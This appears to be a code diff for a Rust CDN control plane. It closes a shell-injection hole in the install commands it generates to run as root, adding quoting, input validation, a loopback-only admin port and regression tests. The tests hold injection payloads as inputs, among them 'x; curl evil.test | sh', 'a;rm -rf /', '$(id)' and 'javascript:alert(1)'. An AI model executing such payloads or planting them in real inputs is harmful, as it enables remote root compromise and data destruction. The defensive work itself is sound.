@@ -291,19 +291,131 @@ fn normalize_country(raw: &str) -> String {
 }
 
 /// Public control-plane URL used inside install commands.
+///
+/// The `Host` and `X-Forwarded-Proto` headers are attacker-controlled on any
+/// deployment that sits behind a proxy, and the result is pasted into a shell
+/// script that runs as root on the edge. When `CONTROL_PUBLIC_URL` is not set we
+/// therefore ignore the headers entirely rather than trusting them, and only
+/// accept a syntactically valid http(s) URL as the configured value.
 fn public_base(state: &AppState, headers: &HeaderMap) -> String {
-    if !state.config.public_url.is_empty() {
-        return state.config.public_url.trim_end_matches('/').to_string();
+    let configured = state.config.public_url.trim().trim_end_matches('/');
+    if let Some(base) = safe_public_base(configured) {
+        return base;
     }
+
+    // Fallback: host:port only, restricted to characters that can appear in an
+    // authority. Anything else is rejected so the value cannot break out of the
+    // shell assignment it is placed into.
     let host = headers
         .get("host")
         .and_then(|v| v.to_str().ok())
         .unwrap_or("127.0.0.1:8080");
-    let proto = headers
-        .get("x-forwarded-proto")
-        .and_then(|v| v.to_str().ok())
-        .unwrap_or("http");
-    format!("{}://{}", proto, host)
+    let host: String = host
+        .trim()
+        .chars()
+        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | ':' | '[' | ']'))
+        .collect();
+    let host = if host.is_empty() {
+        "127.0.0.1:8080".to_string()
+    } else {
+        host
+    };
+    let proto = match headers.get("x-forwarded-proto").and_then(|v| v.to_str().ok()) {
+        Some(p) if p.eq_ignore_ascii_case("https") => "https",
+        _ => "http",
+    };
+    format!("{proto}://{host}")
+}
+
+/// Accept only `http(s)://host[:port][/path]` with no whitespace or shell
+/// metacharacters. Returns `None` for anything else.
+fn safe_public_base(raw: &str) -> Option<String> {
+    let trimmed = raw.trim().trim_end_matches('/');
+    if trimmed.is_empty() {
+        return None;
+    }
+    let rest = trimmed
+        .strip_prefix("https://")
+        .or_else(|| trimmed.strip_prefix("http://"))?;
+    if rest.is_empty() || !rest.starts_with(|c: char| c.is_ascii_alphanumeric()) {
+        return None;
+    }
+    if rest.chars().any(|c| {
+        c.is_whitespace()
+            || c.is_control()
+            || matches!(c, '"' | '\'' | '`' | ';' | '&' | '|' | '$' | '(' | ')' | '<' | '>' | '*' | '?' | '!' | '{' | '}')
+    }) {
+        return None;
+    }
+    Some(trimmed.to_string())
+}
+
+/// Quote a value for safe interpolation into a POSIX shell script.
+///
+/// `region`, `agent_url` and the node name all originate from an API request and
+/// end up in commands an operator copies and runs as root on an edge host. Single
+/// quotes make the whole value literal; embedded single quotes are closed,
+/// escaped and reopened ('\'').
+fn shell_quote(value: &str) -> String {
+    let mut out = String::with_capacity(value.len() + 2);
+    out.push('\'');
+    for ch in value.chars() {
+        if ch == '\'' {
+            out.push_str("'\\''");
+        } else {
+            out.push(ch);
+        }
+    }
+    out.push('\'');
+    out
+}
+
+/// Values pasted verbatim into `export X=...` or `docker run -e X=...`.
+///
+/// Region names are operator labels; anything outside this set is almost
+/// certainly a mistake or an injection attempt and is rejected up front instead
+/// of being quoted and stored.
+fn validate_region(region: &str) -> Result<String, String> {
+    let region = region.trim();
+    if region.is_empty() {
+        return Ok("default".into());
+    }
+    if region.len() > 64 {
+        return Err("region must be at most 64 characters".into());
+    }
+    if !region
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
+    {
+        return Err("region may only contain letters, digits, '-', '_' and '.'".into());
+    }
+    Ok(region.to_string())
+}
+
+/// The edge agent URL must be a plain http(s) origin.
+fn validate_agent_url(agent_url: &str) -> Result<String, String> {
+    let trimmed = agent_url.trim();
+    if trimmed.is_empty() {
+        return Ok(String::new());
+    }
+    if trimmed.len() > 256 {
+        return Err("agent_url is too long".into());
+    }
+    let rest = trimmed
+        .strip_prefix("https://")
+        .or_else(|| trimmed.strip_prefix("http://"))
+        .ok_or_else(|| "agent_url must start with http:// or https://".to_string())?;
+    if rest.is_empty() || !rest.starts_with(|c: char| c.is_ascii_alphanumeric()) {
+        return Err("agent_url must contain a host".into());
+    }
+    if rest.chars().any(|c| {
+        c.is_whitespace()
+            || c.is_control()
+            || matches!(c, '"' | '\'' | '`' | ';' | '&' | '|' | '$' | '(' | ')' | '<' | '>')
+    }) {
+        return Err("agent_url contains characters that are not allowed".into());
+    }
+    Ok(trimmed.trim_end_matches('/').to_string())
 }
 
 fn install_commands(
@@ -321,33 +433,48 @@ fn install_commands(
     };
     let region = if region.is_empty() { "default" } else { region };
 
+    // Every value interpolated below comes from an API request and the output is
+    // a script an operator pastes into a root shell on the edge host, so each one
+    // is single-quoted. The previous code interpolated raw values with `format!`,
+    // which turned a crafted `region` into arbitrary root command execution.
+    let base_q = shell_quote(base);
+    let name_q = shell_quote(name);
+    let region_q = shell_quote(region);
+    let ip_q = shell_quote(public_ip);
+    let agent_q = shell_quote(&agent_url);
+    let token_q = shell_quote(token);
+    // The default `<节点公网IP>` placeholder is not a shell value; substitute
+    // the real public IP when the caller did not supply an agent URL.
+    let agent_q = agent_q.replace("<节点公网IP>", &public_ip.replace('\'', ""));
+
     let binary = format!(
         r#"# 在边缘服务器上执行（当前目录包含 lagran-edge 二进制）
-export CONTROL_URL={base}
-export NODE_ID={name}
-export NODE_REGION={region}
-export PUBLIC_IP={public_ip}
-export AGENT_URL={agent_url}
-export AGENT_TOKEN={token}
+export CONTROL_URL={base_q}
+export NODE_ID={name_q}
+export NODE_REGION={region_q}
+export PUBLIC_IP={ip_q}
+export AGENT_URL={agent_q}
+export AGENT_TOKEN={token_q}
 export EDGE_LISTEN=0.0.0.0:80
-export EDGE_ADMIN_LISTEN=0.0.0.0:8081
+# 管理面只监听回环：purge / certs / update 等接口不走公网。
+# 需要远程管理时请用反向代理并配置鉴权。
+export EDGE_ADMIN_LISTEN=127.0.0.1:8081
 export CACHE_BACKEND=memory
 
 ./lagran-edge"#
     );
 
     let docker = format!(
-        r#"docker run -d --name lagran-edge-{name} --restart=always \
+        r#"docker run -d --name lagran-edge-{name_q} --restart=always \
   -p 80:80 \
-  -p 8081:8081 \
-  -e CONTROL_URL={base} \
-  -e NODE_ID={name} \
-  -e NODE_REGION={region} \
-  -e PUBLIC_IP={public_ip} \
-  -e AGENT_URL={agent_url} \
-  -e AGENT_TOKEN={token} \
+  -e CONTROL_URL={base_q} \
+  -e NODE_ID={name_q} \
+  -e NODE_REGION={region_q} \
+  -e PUBLIC_IP={ip_q} \
+  -e AGENT_URL={agent_q} \
+  -e AGENT_TOKEN={token_q} \
   -e EDGE_LISTEN=0.0.0.0:80 \
-  -e EDGE_ADMIN_LISTEN=0.0.0.0:8081 \
+  -e EDGE_ADMIN_LISTEN=127.0.0.1:8081 \
   -e CACHE_BACKEND=memory \
   -v /var/lib/lagran/cache:/data/cache \
   -e DISK_CACHE_DIR=/data/cache \
@@ -400,9 +527,13 @@ pub async fn create(
     }
 
     let token = new_token();
-    let region = req.region.clone().unwrap_or_default();
+    // Both values are interpolated into the install commands: validate them
+    // instead of quoting a value that was never meant to be legal.
+    let region = validate_region(req.region.as_deref().unwrap_or(""))
+        .map_err(|e| (StatusCode::BAD_REQUEST, Json(ErrorBody { error: e })))?;
+    let agent_url = validate_agent_url(req.agent_url.as_deref().unwrap_or(""))
+        .map_err(|e| (StatusCode::BAD_REQUEST, Json(ErrorBody { error: e })))?;
     let base = public_base(&state, &headers);
-    let agent_url = req.agent_url.clone().unwrap_or_default();
 
     let row = repository::create_node(
         &state.pool,
@@ -739,6 +870,115 @@ async fn apply_heartbeat(
                 enabled: true,
                 status: "unknown".into(),
             })
+        }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// The install commands are pasted into a root shell on the edge host, so a
+    /// value that escapes its quoting is remote code execution. This is the
+    /// regression that made `region` and `agent_url` exploitable.
+    #[test]
+    fn shell_quote_neutralizes_metacharacters() {
+        assert_eq!(shell_quote("plain"), "'plain'");
+        assert_eq!(shell_quote(""), "''");
+        assert_eq!(shell_quote("a;rm -rf /"), "'a;rm -rf /'");
+        assert_eq!(shell_quote("$(id)"), "'$(id)'");
+        assert_eq!(shell_quote("`id`"), "'`id`'");
+        // Embedded single quotes are closed, escaped and reopened.
+        assert_eq!(shell_quote("it's"), "'it'\\''s'");
+    }
+
+    #[test]
+    fn install_commands_never_contain_raw_injection() {
+        let cmds = install_commands(
+            "https://cp.example.test",
+            "edge-1",
+            "cn-north",
+            "203.0.113.7",
+            "http://203.0.113.7:8081",
+            "tok",
+        );
+        assert!(cmds.binary.contains("export NODE_REGION='cn-north'"));
+        assert!(cmds.binary.contains("export AGENT_TOKEN='tok'"));
+        // Management endpoints must not be published on a public interface.
+        assert!(cmds.binary.contains("EDGE_ADMIN_LISTEN=127.0.0.1:8081"));
+        assert!(cmds.docker.contains("EDGE_ADMIN_LISTEN=127.0.0.1:8081"));
+        assert!(!cmds.binary.contains("0.0.0.0:8081"));
+        assert!(!cmds.docker.contains("0.0.0.0:8081"));
+        // The admin port must not be published by docker either.
+        assert!(!cmds.docker.contains("-p 8081:8081"));
+    }
+
+    #[test]
+    fn install_commands_quote_injected_input() {
+        let cmds = install_commands(
+            "https://cp.example.test",
+            "edge)",
+            "x; curl evil.test | sh",
+            "203.0.113.7",
+            "http://a.test",
+            "tok",
+        );
+        // The payload appears only inside single quotes.
+        assert!(cmds.binary.contains("'x; curl evil.test | sh'"));
+        assert!(!cmds.binary.contains("NODE_REGION=x;"));
+        assert!(cmds.docker.contains("'x; curl evil.test | sh'"));
+    }
+
+    #[test]
+    fn region_validation_rejects_injection() {
+        assert_eq!(validate_region("").unwrap(), "default");
+        assert_eq!(validate_region("cn-north").unwrap(), "cn-north");
+        assert_eq!(validate_region("eu_west.1").unwrap(), "eu_west.1");
+        for bad in ["a;b", "a b", "$(id)", "a|b", "a`b", "a&b", "a'b"] {
+            assert!(validate_region(bad).is_err(), "{bad:?} must be rejected");
+        }
+        assert!(validate_region(&"a".repeat(65)).is_err());
+    }
+
+    #[test]
+    fn agent_url_validation_rejects_injection() {
+        assert_eq!(validate_agent_url("").unwrap(), "");
+        assert_eq!(
+            validate_agent_url("http://1.2.3.4:8081/").unwrap(),
+            "http://1.2.3.4:8081"
+        );
+        for bad in [
+            "1.2.3.4:8081",
+            "http://a.test;id",
+            "http://a.test$(id)",
+            "http://",
+            "ftp://a.test",
+        ] {
+            assert!(validate_agent_url(bad).is_err(), "{bad:?} must be rejected");
+        }
+    }
+
+    /// `CONTROL_PUBLIC_URL` is operator-controlled but still ends up in a root
+    /// shell script, so only a plain http(s) URL is accepted.
+    #[test]
+    fn public_base_accepts_only_plain_urls() {
+        assert_eq!(
+            safe_public_base("https://cdn.example.test").as_deref(),
+            Some("https://cdn.example.test")
+        );
+        assert_eq!(
+            safe_public_base("http://cp:8080/").as_deref(),
+            Some("http://cp:8080")
+        );
+        for bad in [
+            "",
+            "javascript:alert(1)",
+            "https://a.test;id",
+            "https://a.test$(id)",
+            "https://a test",
+            "//a.test",
+        ] {
+            assert!(safe_public_base(bad).is_none(), "{bad:?} must be rejected");
         }
     }
 }
